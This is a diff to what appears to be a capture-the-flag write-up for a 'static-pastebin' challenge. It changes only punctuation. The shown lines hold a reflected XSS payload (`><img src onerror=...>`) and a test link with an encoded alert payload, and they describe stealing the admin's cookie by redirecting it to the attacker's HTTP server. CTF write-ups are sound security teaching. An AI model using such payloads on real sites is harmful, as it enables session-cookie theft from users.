@@ -2,7 +2,7 @@
 
 Reflected XSS Payload: `><img src onerror="<JS code to receive the flag>"`
 
-Test [`><img src onerror="alert(document.domain)"`](https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=)
+Test: [`><img src onerror="alert(document.domain)"`](https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=)
 
 The flag will be the Admin's cookie. You only need to send a paylaod to Admin and make a redirect to your HTTP server with Admin's cookie.
 
